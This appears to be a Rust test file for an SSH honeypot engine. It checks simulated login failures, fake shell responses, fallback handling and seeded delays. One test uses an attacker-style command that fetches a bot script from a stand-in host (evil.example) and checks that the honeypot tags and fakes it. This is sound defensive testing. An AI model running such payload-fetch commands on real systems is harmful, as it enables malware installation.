use std::sync::Arc;
use std::time::Duration;

use bytes::Bytes;
use hp_core::{Action, Event, Secret};
use hp_track::{Outcome, Session, Track, Value};

const SSH: &str = include_str!("../../../tracks/ssh-linux-gateway.yaml");

fn session(seed: u64) -> Session {
    Session::new(Arc::new(Track::from_yaml(SSH).expect("example track is valid")), seed)
}
fn login(user: &str) -> Event {
    Event::AuthAttempt { user: user.into(), secret: Secret::new("hunter2") }
}
fn cmd(c: &str) -> Event { Event::Command(c.into()) }

fn sent(o: &Outcome) -> String {
    o.actions.iter().filter_map(|a| match a { Action::Send(b) => Some(String::from_utf8_lossy(b).into_owned()), _ => None }).collect()
}
fn auth(o: &Outcome) -> Option<bool> {
    o.actions.iter().find_map(|a| match a { Action::AuthResult(b) => Some(*b), _ => None })
}
fn delay(o: &Outcome) -> Option<Duration> {
    o.actions.iter().find_map(|a| match a { Action::Delay(d) => Some(*d), _ => None })
}

#[test]
fn fails_three_logins_then_succeeds() {
    let mut s = session(1);
    for i in 0..3 {
        let o = s.step(&login("root"));
        assert_eq!(auth(&o), Some(false), "attempt {i}");
        let d = delay(&o).unwrap();
        assert!((800..=1500).contains(&(d.as_millis() as u64)), "{d:?}");
        assert_eq!(s.state(), "auth");
    }
    let o = s.step(&login("root"));
    assert_eq!(auth(&o), Some(true));
    assert_eq!(o.tags, ["auth_success"]);
    assert_eq!(o.transitions, [("auth".to_string(), "shell".to_string())]);
    assert_eq!(s.state(), "shell");
    assert_eq!(s.vars()["failed_logins"], Value::Int(3));
    assert!(o.errors.is_empty());
}

#[test]
fn shell_answers_and_remembers() {
    let mut s = session(1);
    for _ in 0..4 { s.step(&login("a")); }
    assert_eq!(sent(&s.step(&cmd("whoami"))), "admin\n");
    assert_eq!(sent(&s.step(&cmd("pwd"))), "/home/admin\n");
    assert!(s.step(&cmd("cd /var/tmp")).actions.is_empty());
    assert_eq!(sent(&s.step(&cmd("pwd"))), "/var/tmp\n");
}

#[test]
fn fetch_is_tagged_and_faked() {
    let mut s = session(7);
    for _ in 0..4 { s.step(&login("a")); }
    let o = s.step(&cmd("wget http://evil.example/x/bot.sh"));
    assert_eq!(o.tags, ["payload_fetch"]);
    assert!(sent(&o).contains("Saving to: 'bot.sh'"));
    let ms = delay(&o).unwrap().as_millis();
    assert!((2000..=4000).contains(&ms));
}

#[test]
fn fallback_and_close() {
    let mut s = session(1);
    for _ in 0..4 { s.step(&login("a")); }
    assert_eq!(sent(&s.step(&cmd("frobnicate --now"))), "-bash: frobnicate: command not found\n");
    assert_eq!(sent(&s.step(&cmd(""))), "-bash: : command not found\n");
    assert!(matches!(s.step(&cmd("exit")).actions[..], [Action::Close]));
}

#[test]
fn unexpected_event_types_hit_fallback_not_panic() {
    let mut s = session(1);
    // Raw bytes / requests / disconnect while in `auth`: fallback closes.
    for ev in [Event::Raw(Bytes::from_static(b"\xff\xfe\x00")), Event::Connected, Event::Disconnected,
               Event::Request { op: "x".into(), args: serde_json_null() }] {
        let o = s.step(&ev);
        assert!(matches!(o.actions[..], [Action::Close]));
    }
}
fn serde_json_null() -> serde_json::Value { serde_json::Value::Null }

#[test]
fn same_seed_same_delays() {
    let run = |seed| {
        let mut s = session(seed);
        (0..3).map(|_| delay(&s.step(&login("r"))).unwrap()).collect::<Vec<_>>()
    };
    assert_eq!(run(42), run(42));
    assert_ne!(run(42), run(43));
}

#[test]
fn runtime_errors_are_reported_not_fatal() {
    let t = Track::from_yaml("
name: t
vars: { n: 0 }
start: a
states:
  a:
    on:
      - match: { command: 'x' }
        when: n
        do: [ { send: 'never' } ]
      - match: { command: 'y' }
        do: [ { set: { n: '1 / n' } }, { send: 'after' } ]
    fallback: { send: 'fb' }
").unwrap();
    let mut s = Session::new(Arc::new(t), 0);
    let o = s.step(&cmd("x"));
    assert_eq!(sent(&o), "fb");
    assert_eq!(o.errors.len(), 1);
    let o = s.step(&cmd("y"));
    assert_eq!(sent(&o), "after");
    assert_eq!(o.errors.len(), 1);
    assert_eq!(s.vars()["n"], Value::Int(0));
}
